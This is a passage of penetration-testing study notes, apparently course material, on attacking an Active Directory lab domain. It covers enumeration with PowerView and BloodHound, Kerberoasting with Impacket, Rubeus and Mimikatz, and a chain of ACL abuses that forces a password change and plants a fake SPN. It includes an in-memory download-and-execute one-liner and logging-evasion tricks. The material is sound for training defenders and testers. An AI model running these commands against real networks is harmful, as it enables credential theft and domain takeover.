    - We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file.
    - [BloodHound Cypher cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)



## Credentialed Enumeration - from Windows
### ActiveDirectory PowerShell Module
- The ActiveDirectory PowerShell module is a group of PowerShell cmdlets for administering an Active Directory environment from the command line.
- The `Get-Module` cmdlet will list all available modules, their version, and potential commands for use. If the module is not loaded, run `Import-Module ActiveDirectory` to load it for use.


```powershell
# Get Domain Info
PS C:\htb> Get-ADDomain

```

- `Get-ADUser` cmdlet, we will be filtering for accounts with the `ServicePrincipalName` property populated. This will get us a listing of accounts that may be susceptible to a Kerberoasting attack.

```powershell
# Get-ADUser
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Checking For Trust Relationships
PS C:\htb> Get-ADTrust -Filter *

# Group Enumeration
PS C:\htb> Get-ADGroup -Filter * | select name

# Detailed Group Info
PS C:\htb> Get-ADGroup -Identity "Backup Operators"

# Group Membership
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"


```

- Utilizing the ActiveDirectory module on a host can be a stealthier way of performing actions than dropping a tool onto a host or loading it into memory and attempting to use it.

### PowerView
- The table below describes some of the most useful functions PowerView offers:

|Command|	Description|
|:------|:-------------|
|Export-PowerViewCSV|	Append results to a CSV file|
|ConvertTo-SID|	Convert a User or group name to its SID value|
|Get-DomainSPNTicket|	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account|
|Domain/LDAP Functions:| |	
|Get-Domain|	Will return the AD object for the current (or specified) domain|
|Get-DomainController|	Return a list of the Domain Controllers for the specified domain|
|Get-DomainUser|	Will return all users or specific user objects in AD|
|Get-DomainComputer|	Will return all computers or specific computer objects in AD|
|Get-DomainGroup|	Will return all groups or specific group objects in AD|
|Get-DomainOU|	Search for all or specific OU objects in AD|
|Find-InterestingDomainAcl|	Finds object ACLs in the domain with modification rights set to non-built in objects|
|Get-DomainGroupMember|	Will return the members of a specific domain group|
|Get-DomainFileServer|	Returns a list of servers likely functioning as file servers|
|Get-DomainDFSShare|	Returns a list of all distributed file systems for the current (or specified) domain|
|GPO Functions:| |	
|Get-DomainGPO|	Will return all GPOs or specific GPO objects in AD|
|Get-DomainPolicy|	Returns the default domain policy or the domain controller policy for the current domain|
|Computer Enumeration Functions:| |	
|Get-NetLocalGroup|	Enumerates local groups on the local or a remote machine|
|Get-NetLocalGroupMember|	Enumerates members of a specific local group|
|Get-NetShare|	Returns open shares on the local (or a remote) machine|
|Get-NetSession|	Will return session information for the local (or a remote) machine|
|Test-AdminAccess|	Tests if the current user has administrative access to the local (or a remote) machine|
|Threaded 'Meta'-Functions:	| |
|Find-DomainUserLocation|	Finds machines where specific users are logged in|
|Find-DomainShare|	Finds reachable shares on domain machines|
|Find-InterestingDomainShareFile|	Searches for files matching specific criteria on readable shares in the domain|
|Find-LocalAdminAccess|	Find machines on the local domain where the current user has local administrator access|
|Domain Trust Functions:||	
|Get-DomainTrust|	Returns domain trusts for the current domain or a specified domain|
|Get-ForestTrust|	Returns all forest trusts for the current forest or a specified forest|
|Get-DomainForeignUser|	Enumerates users who are in groups outside of the user's domain|
|Get-DomainForeignGroupMember|	Enumerates groups with users outside of the group's domain and returns each foreign member|
|Get-DomainTrustMapping|	Will enumerate all trusts for the current domain and any others seen.|


```powershell
# Domain User Information
PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol


# Recursive Group Membership
PS C:\htb>  Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# Trust Enumeration
PS C:\htb> Get-DomainTrustMapping

# Testing for Local Admin Access
PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01


# Finding Users With SPN Set
PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

```


### SharpView
- Another tool worth experimenting with is SharpView, a .NET port of PowerView. Many of the same functions supported by PowerView can be used with SharpView.

```powershell
PS C:\htb> .\SharpView.exe Get-DomainUser -Help

```


### Snaffler
- [Snaffler](https://github.com/SnaffCon/Snaffler) is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment.
- Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories.
- Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. 
- Snaffler requires that it be run from a domain-joined host or in a domain-user context.
```powershell
# Snaffler Execution
Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

# -s tells it to print results to the console for us 
# -d specifies the domain to search within
# -o tells Snaffler to write results to a logfile. 
# -v option is the verbosity level.

```


### BloodHound
- First, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host.

```powershell
# Running SharpHound Collector
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT

```

- For running, type bloodhound into a CMD or PowerShell console


## Living Off the Land
### Env Commands For Host & Network Recon

|Command|	Result|
|:------|:--------|
|hostname|	Prints the PC's Name|
|[System.Environment]::OSVersion.Version|	Prints out the OS version and revision level|
|wmic qfe get Caption,Description,HotFixID,InstalledOn|	Prints the patches and hotfixes applied to the host|
|ipconfig /all|	Prints out network adapter state and configurations|
|set|	Displays a list of environment variables for the current session (ran from CMD-prompt)|
|echo %USERDOMAIN%|	Displays the domain name to which the host belongs (ran from CMD-prompt)|
|echo %logonserver%|	Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|

- We can cover the information above with one command `systeminfo`.

### Harnessing PowerShell

|Cmd-Let|	Description|
|:------|:-------------|
|Get-Module|	Lists available modules loaded for use.|
|Get-ExecutionPolicy -List|	Will print the execution policy settings for each scope on a host.|
|Set-ExecutionPolicy Bypass -Scope Process|	This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|
|Get-ChildItem Env: \| ft Key,Value	| Return environment values such as key paths, users, computer information, etc.|
|Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt|	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|
|powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"|	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|


- Many defenders are unaware that several versions of PowerShell often exist on a host. 
- Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. 
- If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. 


```powershell
# Downgrade Powershell

PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
InstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
DebuggerEnabled  : True
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\htb> Get-host
Name             : ConsoleHost
Version          : 2.0
InstanceId       : 121b807c-6daa-4691-85ef-998ac137e469
UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface
CurrentCulture   : en-US
CurrentUICulture : en-US
PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy
IsRunspacePushed : False
Runspace         : System.Management.Automation.Runspaces.LocalRunspace

```

### Checking Defenses

```powershell
# Firewall checks
PS C:\htb> netsh advfirewall show allprofiles

# Windows Defender Check (from CMD.exe)
C:\htb> sc query windefend

# Check the status and configuration settings
PS C:\htb> Get-MpComputerStatus


```

- Check and see if you are the only one logged in.
```powershell
# Using qwinsta
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen

```

### Network Information

|Networking Commands|	Description |
|:------------------|:--------------|
|arp -a|	Lists all known hosts stored in the arp table.|
|ipconfig /all|	Prints out adapter settings for the host. We can figure out the network segment from here.|
|route print|	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|
|netsh advfirewall show allprofiles|	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|


### Windows Management Instrumentation (WMI)
- Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts.

|Command|	Description|
|:------|:-------------|
|wmic qfe get Caption,Description,HotFixID,InstalledOn|	Prints the patch level and description of the Hotfixes applied|
|wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List|	Displays basic host information to include any attributes within the list|
|wmic process list /format:list|	A listing of all processes on host|
|wmic ntdomain list /format:list|	Displays information about the Domain and Domain Controllers|
|wmic useraccount list /format:list|	Displays information about all local accounts and any domain accounts that have logged into the device|
|wmic group list /format:list|	Information about all local groups|
|wmic sysaccount list /format:list|	Dumps information about any system accounts that are being used as service accounts.|

- [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)


### Net Commands
- Table of Useful Net Commands

|Command|	Description|
|:------|:-------------|
|net accounts|	Information about password requirements|
|net accounts /domain|	Password and lockout policy|
|net group /domain|	Information about domain groups|
|net group "Domain Admins" /domain|	List users with domain admin privileges|
|net group "domain computers" /domain|	List of PCs connected to the domain|
|net group "Domain Controllers" /domain|	List PC accounts of domains controllers|
|net group <domain_group_name> /domain|	User that belongs to the group|
|net groups /domain|	List of domain groups|
|net localgroup|	All available groups|
|net localgroup administrators /domain|	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)|
|net localgroup Administrators|	Information about a group (admins)|
|net localgroup administrators [username] /add|	Add user to administrators|
|net share|	Check current shares|
|net user <ACCOUNT_NAME> /domain|	Get information about a user within the domain|
|net user /domain|	List all users of the domain|
|net user %username%|	Information about the current user|
|net use x: \computer\share|	Mount the share locally|
|net view|	Get a list of computers|
|net view /all /domain[:domainname]	|Shares on the domains|
|net view \computer /ALL|	List shares of a computer|
|net view /domain|	List of PCs of the domain|


> [!TIP]
> Net Commands Trick: Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.


### Dsquery
- Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects.
- With that in mind, dsquery will exist on any host with the `Active Directory Domain Services Role` installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.
- All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context.

```powershell
# User Search
PS C:\htb> dsquery user


# Computer Search
PS C:\htb> dsquery computer

# Wildcard Search
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

```

- We can combine dsquery with LDAP search filters of our choosing.
```powershell
# Users With Specific Attributes Set (PASSWD_NOTREQD)
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Searching for Domain Controllers
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

```

- **LDAP Filtering**
    - You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. 
    - These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others.
    - `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD ,also known as Object Identifiers (OIDs).
    - `=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set.
![UAC-values](/images/UAC-values.jpg)

- **OID match strings**
- OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. 1.2.840.113556.1.4.803
- When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

2. 1.2.840.113556.1.4.804
- When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

3. 1.2.840.113556.1.4.1941
- This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

- **Logical Operators**
- When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
- The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. 

## Kerberoasting
- **Overview**
    - Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments.
    - This attack targets Service Principal Names (SPN) accounts. 
    - SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running.
    - All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

- Depending on your position in a network, this attack can be performed in multiple ways:

    - From a non-domain joined Linux host using valid domain user credentials.
    - From a domain-joined Linux host as root after retrieving the keytab file.
    - From a domain-joined Windows host authenticated as a domain user.
    - From a domain-joined Windows host with a shell in the context of a domain account.
    - As SYSTEM on a domain-joined Windows host.
    - From a non-domain joined Windows host using runas /netonly.



> [!NOTE]
> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

### Kerberoasting - from Linux
#### Kerberoasting with GetUserSPNs.py
- We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket.

```bash
# Listing SPN Accounts with GetUserSPNs.py
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

```

- We can now pull all TGS tickets for offline processing using the `-request` flag.

```bash
# Requesting all TGS Tickets
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Requesting a Single TGS ticket
impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# -outputfile flag to write the TGS tickets to a file


# Cracking the ticket offline with hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

### Kerberoasting - from Windows
#### Kerberoasting - Semi Manual method

```bat
# Enumerating SPNs with built-in setspn.exe
C:\htb> setspn.exe -Q */*

```

- Using PowerShell, we can request TGS tickets for an account and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz.

```powershell
# Targeting a Single User
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

```

- **Explanation**
    - The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
    - The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
    - `System.IdentityModel` is a namespace that contains different classes for building security token services
    - We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
    - We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session


- We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

```powershell
# Retrieving All Tickets Using setspn.exe
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }


```
- Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

```bat 
# Extracting Tickets from Memory with Mimikatz
mimikatz # base64 /out:true

mimikatz # kerberos::list /export  

```

- If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. 

```bash
# Preparing the Base64 Blob for Cracking
echo "<base64 blob>" |  tr -d \\n 


# Placing the Output into a File as .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Extracting the Kerberos Ticket using kirbi2john.py
kirbi2john.py sqldev.kirbi

# Modifiying resulted crack_file for Hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Cracking the Hash with Hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 



```

- We can place the above single line of output into a file and convert it back to a `.kirbi` file using the base64 utility.

#### Automated / Tool Based Route
```powershell
# Using PowerView to Extract TGS Tickets
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

# Using PowerView to Target a Specific User
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Exporting All Tickets to a CSV File
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation



# Using Rubeus
# Using the /stats Flag
PS C:\htb> .\Rubeus.exe kerberoast /stats

# Request tickets for accounts with the admincount attribute set to 1. Using the /nowrap Flag
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Using /tgtdeleg flag
PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:forend /nowrap
```

- To avoid retrieve `AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96`, we can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket.
- The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility.

> [!NOTE]
> This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account.

- It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos


## ACLs - ACEs Abuse
- **Overview**
    - ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD.

- There are 2 types of ACLs: 
    1. Discretionary Access Control List (DACL):
        - Think of this as a "permission list" for an object (like a file or folder). It decides who can access it and what they are allowed to do (read, write, delete, etc.). Here's how it works:

        - ACE (Access Control Entry): These are the rules in the list, like "User A can read," or "User B cannot write."
        - When someone tries to access the object, the system checks the DACL to see what they are allowed to do.
        - If there’s no DACL, it’s as if the door is wide open—everyone has full access.
        - If the DACL exists but is empty (no rules), the door is locked—no one can get in.
    2. System Access Control List (SACL):
        - This is like a "security camera log." It doesn't control access but keeps a record of who tried to access the object and what they tried to do. It’s useful for administrators who want to track or monitor suspicious activity or failed access attempts.
        
- In short:

    - DACL = Controls "who can do what."
    - SACL = Tracks "who tried to do what."

- Example: ![DACL_example](/images/DACL_example.jpg)
    - Each item under Permission entries makes up the DACL for the user account, while the individual entries (such as Full Control or Change Password) are ACE entries showing rights granted over this user object to various users and groups.
    - The SACLs can be seen within the Auditing tab.


- **Access Control Entries (ACEs)**
    - Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:

    |ACE	| Description|
    |:------|:-----------|
    |Access denied ACE|	Used within a DACL to show that a user or group is explicitly denied access to an object|
    |Access allowed ACE|	Used within a DACL to show that a user or group is explicitly granted access to an object|
    |System audit ACE|	Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred|

    - Each ACE is made up of the following four components:

        - The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
        - A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
        - A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
        - An access mask which is a 32-bit value that defines the rights granted to an object

![ACL Attacks Graphic](/images/ACL_attacks_graphic.jpg)

### ACL Enumeration
#### Enumerating ACLs with PowerView

- Get the SID of our target user to search effectively.
```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley


```

- We can then use the `Get-DomainObjectACL` function to perform our targeted search. We are using this function to find all domain objects that our user has rights over by mapping the user's SID using the `$sid` variable to the `SecurityIdentifier` property which is what tells us who has the given right over an object.

```powershell
# Using Get-DomainObjectACL and -ResolveGUIDs Flag

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 

AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0

```
- **Alternatives for PowerView**  
    - Using the Get-Acl and Get-ADUser
        1. Creating a List of Domain Users: `PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt`
        2. A Useful foreach Loop: `PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}`
        3. Performing a Reverse Search & Mapping to a GUID Value. 
        ```powershell
        PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
        PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
        ```


```powershell
# Investigating the Help Desk Level 1 Group with Get-DomainGroup
PS C:\htb> Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

#### Enumerating ACLs with BloodHound
![wley_damundsen](/images/wley_damundsen.jpg)

- We can set the wley user as our starting node, select the Node Info tab and scroll down to Outbound Control Rights. This option will show us objects we have control over directly, via group membership, and the number of objects that our user could lead to us controlling via ACL attack paths under Transitive Object Control. If we click on the 1 next to First Degree Object Control, we see the first set of rights that we enumerated, ForceChangePassword over the damundsen user.

- If we right-click on the line between the two objects, a menu will pop up. If we select Help, we will be presented with help around abusing this ACE, including:

    - More info on the specific right, tools, and commands that can be used to pull off this attack
    - Operational Security (Opsec) considerations
    - External references.

### Abusing ACLs
- Example:
    ![wley_path](/images/wley_path.jpg) 

    1. Use the wley user to change the password for the damundsen user
    2. Authenticate as the damundsen user and leverage GenericWrite rights to add a user that we control to the Help Desk Level 1 group
    3. Take advantage of nested group membership in the Information Technology group and leverage GenericAll rights to take control of the adunn user

1. 
    - So, first, we must authenticate as wley and force change the password of the user damundsen.
    ```powershell
    # Creating a PSCredential Object
    PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 

    ```
    - Next, we must create a `SecureString` object which represents the password we want to set for the target user damundsen.
    ```powershell
    # Creating a SecureString Object
    PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

    # Changing the User's Password
    PS C:\htb> Import-Module .\PowerView.ps1
    PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
    ```
2. 
    - Authenticate as the damundsen user and add ourselves to the Help Desk Level 1 group.
    ```powershell
    # Creating a SecureString Object using damundsen
    PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
    PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword) 
    ```
    - We can first confirm that our user is not a member of the target group.
    ```powershell
    PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
    ```
    - We can use the `Add-DomainGroupMember` function to add ourselves to the target group.
    ```powershell
    PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

    # Confirming damundsen was Added to the Group
    PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

    ```

- adunn user is an admin account that cannot be interrupted. Since we have `GenericAll` rights over this account, we can have even more fun and perform a targeted Kerberoasting attack by modifying the account's `servicePrincipalName` attribute to create a fake SPN that we can then Kerberoast to obtain the TGS ticket and (hopefully) crack the hash offline using Hashcat.

3. 
    - We can now use `Set-DomainObject` to create the fake SPN. We could use the tool [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to perform this same attack from a Linux host, and it will create a temporary SPN, retrieve the hash, and delete the temporary SPN all in one command.
    ```powershell
    # Creating a Fake SPN
    PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

    # Kerberoasting with Rubeus
    PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

    ```
    - Great! We have successfully obtained the hash. The last step is to attempt to crack the password offline using Hashcat. Once we have the cleartext password, we could now authenticate as the adunn user and perform the DCSync attack.


#### Cleanup
- In terms of cleanup, there are a few things we need to do:

    1. Remove the fake SPN we created on the adunn user.
    2. Remove the damundsen user from the Help Desk Level 1 group
    3. Set the password for the damundsen user back to its original value (if we know it) or have our client set it/alert the user

- This order is important because if we remove the user from the group first, then we won't have the rights to remove the fake SPN.

```powershell
# Removing the Fake SPN from adunn's Account
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Removing damundsen from the Help Desk Level 1 Group
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose


# Confirming damundsen was Removed from the Group
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose


```